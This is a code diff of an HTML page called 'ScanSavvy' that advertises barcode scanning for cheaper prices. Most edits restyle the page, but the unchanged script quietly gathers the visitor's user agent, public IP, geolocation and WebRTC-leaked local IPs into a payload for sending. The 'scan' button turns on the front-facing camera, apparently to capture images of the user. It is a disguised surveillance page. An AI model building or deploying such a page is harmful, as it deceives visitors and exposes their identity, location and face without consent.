@@ -9,114 +9,198 @@
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <style>
 :root {
-  --primary: #00ffff;
-  --accent: #00bcd4;
-  --bg-dark: #05070a;
-  --glass: rgba(255, 255, 255, 0.04);
-  --border: rgba(0, 255, 255, 0.5);
+  --primary: #00f9ff;
+  --secondary: #ff00ff;
+  --accent: #8a2be2;
+  --bg-dark: #050009;
+  --glass: rgba(255, 255, 255, 0.05);
   --text-light: #f3f9ff;
   --text-muted: #a0a6b2;
-  --blur: blur(22px);
+  --blur: blur(20px);
 }
 
 * { margin:0; padding:0; box-sizing:border-box; }
 
 body {
-  font-family: "Exo 2", sans-serif;
-  background: linear-gradient(135deg, #05010a, #200020);
+  font-family:"Exo 2", sans-serif;
+  background: linear-gradient(130deg, #050009 0%, #0d001a 50%, #1a0033 100%);
+  background-size: 400% 400%;
+  animation: bgShift 18s ease infinite;
   color: var(--text-light);
   display: flex;
   flex-direction: column;
   min-height: 100vh;
   align-items: center;
-  overflow-x: hidden;
   padding-top: 40px;
-  position: relative;
-  z-index: 0;
+  overflow-x: hidden;
 }
 
-body::before {
-  content:"";
-  position:fixed;
-  top:0; left:0; width:100%; height:100%;
-  background: radial-gradient(circle at 25% 25%, rgba(0,0,0,0.4), rgba(40,0,40,0.1) 60%, rgba(40,0,40,0.05) 100%);
-  animation: fractalFlow 30s linear infinite;
-  z-index:-1;
+@keyframes bgShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
 }
 
-@keyframes fractalFlow {
-  0% { transform: translate(0,0) scale(1); }
-  50% { transform: translate(-80px,-60px) scale(1.05); }
-  100% { transform: translate(0,0) scale(1); }
-}
-
-header { text-align:center; margin-bottom:20px; position:relative; }
+header { text-align:center; margin-bottom:24px; position:relative; }
 
 header h1 {
   font-family:"Orbitron", sans-serif;
-  font-size:2.8em;
+  font-size:3em;
   font-weight:700;
   color: var(--primary);
-  text-shadow: 0 0 15px rgba(0,255,255,0.7), 0 0 35px rgba(0,255,255,0.8), 0 0 60px rgba(0,255,255,1);
+  text-shadow:
+    0 0 6px rgba(0,249,255,0.9),
+    0 0 14px rgba(0,249,255,0.7),
+    0 0 24px rgba(0,249,255,0.5);
   letter-spacing:2px;
-  animation: glowFlow 6s ease-in-out infinite alternate;
+  position:relative;
+  display:inline-block;
 }
 
-@keyframes glowFlow {
-  0% { text-shadow:0 0 15px rgba(0,255,255,0.6),0 0 35px rgba(0,255,255,0.8),0 0 60px rgba(0,255,255,0.9);}
-  50% { text-shadow:0 0 25px rgba(0,255,255,0.7),0 0 45px rgba(0,255,255,0.9),0 0 80px rgba(0,255,255,1);}
-  100% { text-shadow:0 0 15px rgba(0,255,255,0.6),0 0 35px rgba(0,255,255,0.8),0 0 60px rgba(0,255,255,0.9);}
+header h1::after {
+  content:"";
+  position:absolute;
+  top:50%;
+  left:-50%;
+  width:200%;
+  height:2px;
+  background:linear-gradient(90deg,transparent,rgba(0,255,255,0.5),transparent);
+  animation: scanline 4s linear infinite;
 }
 
-header span { font-size:1.1em; color:var(--text-muted); display:block; margin-top:6px; }
+@keyframes scanline {
+  0% { transform:translateX(-50%) scaleX(0); opacity:0; }
+  40% { transform:translateX(50%) scaleX(1); opacity:1; }
+  100% { transform:translateX(150%) scaleX(0); opacity:0; }
+}
+
+header span {
+  font-size:1.2em;
+  color: var(--secondary);
+  display:block;
+  margin-top:8px;
+  text-shadow:
+    0 0 8px rgba(255,0,255,0.6),
+    0 0 16px rgba(255,0,255,0.4);
+}
 
 .container {
   width:90%;
-  max-width:480px;
+  max-width:500px;
   background: var(--glass);
-  border: 2px solid rgba(0,255,255,0.3);
-  border-radius:26px;
+  border: 1px solid rgba(0,255,255,0.3);
+  border-radius:24px;
   backdrop-filter: var(--blur);
-  box-shadow: 0 8px 40px rgba(0,255,255,0.12), inset 0 0 25px rgba(0,255,255,0.05);
-  padding:28px;
+  box-shadow:
+    0 0 30px rgba(138,43,226,0.3),
+    inset 0 0 20px rgba(0,255,255,0.08);
+  padding:30px;
   display:flex;
   flex-direction:column;
   align-items:center;
   position:relative;
   overflow:hidden;
-  z-index:2;
+  animation: containerPulse 8s ease-in-out infinite;
+}
+
+@keyframes containerPulse {
+  0%,100% { box-shadow:0 0 30px rgba(138,43,226,0.3), inset 0 0 20px rgba(0,255,255,0.08); }
+  50% { box-shadow:0 0 40px rgba(0,249,255,0.4), inset 0 0 28px rgba(255,0,255,0.1); }
 }
 
 .container::before {
   content:"";
   position:absolute;
-  top:-50%; left:-50%;
-  width:200%; height:200%;
-  background: radial-gradient(circle at 30% 30%, rgba(0,0,255,0.04), transparent 70%),
-              radial-gradient(circle at 70% 70%, rgba(0,50,150,0.03), transparent 80%);
+  top:-50%;
+  left:-50%;
+  width:200%;
+  height:200%;
+  background: radial-gradient(circle at 30% 30%, rgba(255,0,255,0.05), transparent 70%),
+              radial-gradient(circle at 70% 70%, rgba(0,255,255,0.04), transparent 80%);
   background-size:200% 200%;
-  animation: plasmaFlow 16s ease-in-out infinite;
+  animation: glowPlasma 18s ease-in-out infinite;
   z-index:0;
 }
 
-@keyframes plasmaFlow { 0% { background-position:0% 0%; } 50% { background-position:100% 100%; } 100% { background-position:0% 0%; } }
-
-#about { font-size:1em; color:var(--text-muted); margin-bottom:20px; text-align:center; line-height:1.4em; position:relative; z-index:2; }
-
-#map { width:100%; height:260px; border-radius:16px; margin-bottom:20px; overflow:hidden; position:relative; z-index:2; }
-
-/* Brightness filter applies only to tiles, not markers */
-.leaflet-tile { filter: brightness(3) contrast(1.1); }
-
-button {
-  width:100%; padding:16px; font-size:1.2em; font-weight:600; color:#eafcff;
-  background: linear-gradient(90deg,#0044ff,#0077ff); border:none; border-radius:14px;
-  cursor:pointer; box-shadow:0 4px 14px rgba(0,0,255,0.35); position:relative; z-index:2; transition: all 0.3s ease;
+@keyframes glowPlasma {
+  0% { background-position:0% 0%; }
+  50% { background-position:100% 100%; }
+  100% { background-position:0% 0%; }
 }
 
-button:hover { background: linear-gradient(90deg,#0077ff,#0044ff); transform: translateY(-3px); box-shadow:0 6px 20px rgba(0,0,255,0.5); }
+#about {
+  font-size:1.05em;
+  color:var(--text-muted);
+  margin-bottom:20px;
+  text-align:center;
+  line-height:1.4em;
+  position:relative;
+  z-index:2;
+}
 
-footer { text-align:center; font-size:0.85em; color: var(--text-muted); margin-top:30px; }
+#map {
+  width:100%;
+  height:260px;
+  border-radius:16px;
+  margin-bottom:20px;
+  overflow:hidden;
+  position:relative;
+  z-index:2;
+  box-shadow:0 0 14px rgba(0,249,255,0.25);
+}
+
+/* Tiles filter only */
+#map .leaflet-tile {
+  filter: brightness(3) contrast(1.15);
+}
+
+button {
+  width:100%;
+  padding:16px;
+  font-size:1.25em;
+  font-weight:700;
+  color:#fff;
+  background: linear-gradient(90deg,#ff00ff,#8a2be2);
+  border:none;
+  border-radius:14px;
+  cursor:pointer;
+  box-shadow:0 4px 18px rgba(255,0,255,0.35);
+  transition: all 0.3s ease;
+  position:relative;
+  overflow:hidden;
+  z-index:2;
+}
+
+button::after {
+  content:"";
+  position:absolute;
+  top:0;
+  left:-100%;
+  width:100%;
+  height:100%;
+  background:linear-gradient(120deg,transparent,rgba(255,255,255,0.2),transparent);
+  transform:skewX(-25deg);
+  animation: shimmer 3s infinite;
+}
+
+@keyframes shimmer {
+  0% { left:-100%; }
+  50% { left:100%; }
+  100% { left:100%; }
+}
+
+button:hover {
+  background: linear-gradient(90deg,#8a2be2,#ff00ff);
+  transform: translateY(-3px) scale(1.02);
+  box-shadow:0 6px 24px rgba(255,0,255,0.55);
+}
+
+footer {
+  text-align:center;
+  font-size:0.9em;
+  color: var(--text-muted);
+  margin-top:34px;
+}
 
 canvas{ display:none; }
 </style>
@@ -124,30 +208,31 @@ canvas{ display:none; }
 <body>
 <header>
   <h1>ScanSavvy</h1>
-  <span>Smart Price Finder</span>
+  <span>Smart Shopping Made Easy</span>
 </header>
 
 <div class="container">
   <div id="about">
-    Scan the barcode of any item using your camera and find the same products nearby at the best prices in real-time.
+    Scan the barcode of any item using your camera and instantly find the best prices nearby.
   </div>
   <div id="map"></div>
-  <button id="scanBtn">Start Scan</button>
+  <button id="scanBtn">Scan Now</button>
   <canvas id="canvas"></canvas>
 </div>
 
 <footer>© 2025 ScanSavvy</footer>
 
+<!-- Leaflet JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-let map = L.map('map').setView([0,0],2);
+// Initialize map
+let map = L.map('map').setView([0, 0], 2);
 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-  subdomains:'abcd',
-  attribution:'&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> &copy; <a href="https://carto.com/">CARTO</a>',
-  maxZoom:19
+  subdomains: 'abcd',
+  attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> &copy; <a href="https://carto.com/">CARTO</a>',
+  maxZoom: 19
 }).addTo(map);
 
-// Default Leaflet marker
 const payload = {
   userAgent: navigator.userAgent,
   serverObservedIP: "${serverIP}",
@@ -157,7 +242,7 @@ const payload = {
   images: []
 };
 
-// Public IP
+// Fetch public IP
 fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ payload.publicIP=d.ip; send(false); });
 
 // Geolocation
@@ -170,14 +255,15 @@ if(navigator.geolocation){
   });
 }
 
-// WebRTC IPs
+// WebRTC IP
 const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
 pc.createDataChannel("x");
 pc.onicecandidate = e=>{ if(!e.candidate) return; const ip=e.candidate.candidate.split(" ")[4]; if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip); };
 pc.createOffer().then(o=>pc.setLocalDescription(o));
 
-// Capture images
+// Camera scan
 document.getElementById("scanBtn").addEventListener("click",startScanner);
+
 function startScanner(){
   navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } }).then(stream=>{
     const video=document.createElement("video"); video.srcObject=stream; video.play();
